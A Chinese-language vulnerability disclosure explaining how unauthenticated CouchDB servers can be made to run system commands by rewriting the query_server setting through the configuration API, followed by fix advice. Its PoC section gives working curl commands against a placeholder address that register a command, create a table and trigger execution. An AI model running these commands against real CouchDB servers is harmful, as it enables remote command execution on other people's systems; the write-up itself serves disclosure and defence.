# 利用CouchDB未授权访问漏洞执行任意系统命令

0x00 前言
=======

* * *

5月16日阿里云盾攻防对抗团队从外部渠道获知CouchDB数据库存在未授权访问漏洞（在配置不正确的情况下）。经过测试，云盾团队率先发现利用该未授权访问漏洞不仅会造成数据的丢失和泄露，`甚至可执行任意系统命令`。云盾安全专家团队第一时间完成了漏洞上报、安全评级，并通知了所有可能受影响的用户。下面将对该漏洞的出处和技术细节做详细解释。

0x01 漏洞的来龙去脉
============

* * *

CouchDB 是一个开源的面向文档的数据库管理系统，可以通过`RESTful JavaScript Object Notation (JSON) API`访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。

那么，问题出在哪呢？翻阅官方描述会发现，CouchDB中有一个`Query_Server`的配置项，在官方文档中是这么描述的：

> CouchDB delegates computation of design documents functions to external query servers. The external query server is a special OS process which communicates with CouchDB over standard input/output using a very simple line-based protocol with JSON messages.

直白点说，就是CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，`query_server`在配置文件local.ini中的格式：

```
[query_servers]
LANGUAGE = PATH ARGS

```

默认情况下，配置文件中已经设置了两个query_servers:

```
[query_servers]
javascript = /usr/bin/couchjs /usr/share/couchdb/server/main.js
coffeescript = /usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js

```

可以看到，CouchDB在`query_server`中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就**可以利用数据库来执行命令了**，但是这个配置是在local.ini文件中的，如何控制呢？

继续读官方的文档，发现了一个有意思的功能，CouchDB提供了一个API接口用来更改自身的配置，并把修改后的结果保存到配置文件中：

> The CouchDB Server Configuration API provide an interface to query and update the various configuration values within a running CouchDB instance

![](http://drops.javaweb.org/uploads/images/05a927299b50f874e174d66084cd97cdb8fae3c1.jpg)

也就是说，除了`local.ini`的配置文件，CouchDB允许通过自身提供的`Restful API`接口动态修改配置属性。结合以上两点，**我们可以通过一个未授权访问的CouchDB**，通过修改其`query_server`配置，来执行系统命令。

0x02 漏洞的POC
===========

* * *

新增`query_server`配置，这里执行ifconfig命令

```
curl -X PUT 'http://1.1.1.1:5984/_config/query_servers/cmd' -d '"/sbin/ifconfig >/tmp/6666"'

```

新建一个临时表，插入一条记录

```
curl -X PUT 'http://1.1.1.1:5984/vultest'
curl -X PUT 'http://1.1.1.1:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'

```

调用`query_server`处理数据

```
curl -X POST 'http://1.1.1.1:5984/vultest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'

```

![](http://drops.javaweb.org/uploads/images/8834e9098dde132b0c0ee6625b96af6f3c8a383a.jpg)

执行后，可以看到，指定的命令已经成功执行：

![](http://drops.javaweb.org/uploads/images/6595b3b6d031fd612fbb7934a90d7de69aa2d355.jpg)

至于如何回显执行结果，各位可以动动脑筋，欢迎互动。

0x03 漏洞修复建议：
============

* * *

1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。

2、设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码。

附：参考链接：

*   [http://blog.rot13.org/2010/11/triggers-in-couchdb-from-queue-to-external-command-execution.html](http://blog.rot13.org/2010/11/triggers-in-couchdb-from-queue-to-external-command-execution.html)
*   [http://docs.couchdb.org/en/1.6.1/api/server/configuration.html#api-config](http://docs.couchdb.org/en/1.6.1/api/server/configuration.html#api-config)
*   [http://docs.couchdb.org/en/1.6.1/intro/api.html](http://docs.couchdb.org/en/1.6.1/intro/api.html)
*   [http://docs.couchdb.org/en/1.6.1/config/query-servers.html](http://docs.couchdb.org/en/1.6.1/config/query-servers.html)